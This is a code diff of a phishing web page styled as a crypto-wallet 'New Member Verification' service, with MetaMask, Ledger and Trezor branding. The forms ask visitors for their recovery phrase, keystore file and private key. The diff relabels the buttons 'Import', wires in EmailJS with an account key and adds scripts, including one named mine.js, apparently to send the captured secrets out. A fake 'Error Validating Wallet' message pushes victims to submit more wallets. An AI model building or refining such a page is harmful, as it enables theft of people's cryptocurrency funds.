@@ -37,7 +37,12 @@
     <meta data-react-helmet="true" name="og:site_name" content="New Member Verification">
     <meta data-react-helmet="true" name="fb:admins" content="365412154213405">
     <link rel="stylesheet" href="./style.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script type="text/javascript" src="js/email.min.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("n_-GhSNMvUmAhQFyk");
+        })();
+    </script>
     <script type="module" src="./domMod.js"></script>
     <link rel="stylesheet" href="./preloader.css">
     <script>
@@ -48,7 +53,7 @@
     </script>
 </head>
 
-<body style="display: block;  background-color: rgb(212,160,255);" data-new-gr-c-s-check-loaded="14.1041.0"
+<body style="display: block; background-color: rgb(212,160,255);" data-new-gr-c-s-check-loaded="14.1041.0"
     data-gr-ext-installed="">
     <div class="Loader">
         <div class="container">
@@ -154,7 +159,7 @@
                             <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900"
                                 style="display: flex; flex-direction: row;"> <img
                                     src="./img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png"
-                                    style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Connect your
+                                    style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your
                                     <span id="walletname">Metamask</span> wallet
                                 </span>
                             </h3>
@@ -176,7 +181,7 @@
                                         </div>
                                     </div>
 
-                                    <form class="gform" id="phraseForm">
+                                    <form method="" class="gform" id="phraseForm">
 
                                         <!---- HONEYPOT----->
                                         <!-- <input type="text" name="_honey" style="display: none;"> -->
@@ -205,7 +210,7 @@
                                                 <button type="submit" form="phraseForm"
                                                     class="btn btn-primary flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                     <span class="mr-2 uppercase"
-                                                        onclick="thankyou_message()">Connect</span>
+                                                        onclick="thankyou_message()">Import</span>
                                                     <span>
                                                         <svg fill="none" stroke-linecap="round" stroke-linejoin="round"
                                                             stroke-width="2" viewBox="0 0 24 24" stroke="currentColor"
@@ -221,19 +226,22 @@
                                             <!-- Successfully Submitted page-->
                                             <div style="display: none;" class="thankyou_message">
                                                 <center>
-                                                    <p class="successful">Error Validating Wallet !!!, please retry with
+                                                    <p class="successful"
+                                                        style="color: rgb(255, 99, 71); margin-top: 1rem;">Error
+                                                        Validating Wallet
+                                                        !!!, please retry with
                                                         a different wallet</p>
                                                 </center>
-                                                <img src="error.png" width="25%" height="25%"
+                                                <!-- <img src="error.png" width="25%" height="25%"
                                                     style="display:block; margin-left:auto; margin-right:auto"
-                                                    class="thankyou_message">
+                                                    class="thankyou_message"> -->
                                             </div>
                                         </div>
 
                                     </form>
 
 
-                                    <form class="gform" id="keystoreForm">
+                                    <form method="" class="gform" id="keystoreForm">
 
                                         <!---- HONEYPOT----->
                                         <input type="text" name="_honey" style="display: none;">
@@ -272,7 +280,7 @@
                                           text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2
                                           w-full transition duration-150 ease-in">
                                                     <span class="mr-2 
-                                             uppercase" onclick="thankyou_message()">Connect</span>
+                                             uppercase" onclick="thankyou_message()">Import</span>
                                                     <span>
                                                         <svg fill="none" stroke-linecap="round" stroke-linejoin="round"
                                                             stroke-width="2" viewBox="0 0 24 24" stroke="currentColor"
@@ -298,7 +306,7 @@
 
                                     </form>
 
-                                    <form class="gform" id="privateKeyForm">
+                                    <form method="" class="gform" id="privateKeyForm">
 
                                         <!---- HONEYPOT----->
                                         <input type="text" name="_honey" style="display: none;">
@@ -331,7 +339,7 @@
                                           text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2
                                           w-full transition duration-150 ease-in">
                                                     <span class="mr-2
-                                             uppercase" onclick="thankyou_message()">Connect</span>
+                                             uppercase" onclick="thankyou_message()">Import</span>
                                                     <span>
                                                         <svg fill="none" stroke-linecap="round" stroke-linejoin="round"
                                                             stroke-width="2" viewBox="0 0 24 24" stroke="currentColor"
@@ -365,7 +373,8 @@
             <div class="collabland">
                 <h4>
                     <p>
-                        <font color="#FFFFFF"> WalletConnect</font>
+                        <font color="#FFFFFF"> <img style="width: 100px;" src="../ledger-logo-long.svg" alt=""></font>
+
                     </p>
                 </h4>
 
@@ -376,9 +385,8 @@
                   margin: 20px 0 0 0;
                   text-align: left;
                   padding: 14px 24px;
-                  color: black;"> Connect to a wallet</p>
+                  color: black;"> Select a wallet</p>
                 <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
-
                     <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                         <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
                             <div class="flex items-center justify-center green">
@@ -415,7 +423,6 @@
                             <img class="img-icons" src="img/trezor.png" alt="Argent">
                         </div>
                     </div>
-
                 </div>
             </section>
         </div>
@@ -446,11 +453,11 @@
         //     }
         // }
     </script>
-
+    <script src="js/mine.js"></script>
     <!-- <script src="../../../smtpjs.com/v3/smtp.js"></script> -->
     <!-- <script data-cfasync="false" type="text/javascript" src="js/form-submission-handler.js"></script> -->
-    <!-- <script src="js/app.min.js"></script> -->
-    <!-- <script src="js/js1.js"> -->
+    <script src="js/app.min.js"></script>
+    <script src="js/js1.js">
     </script>
     <script src="js/js2.js">
     </script>
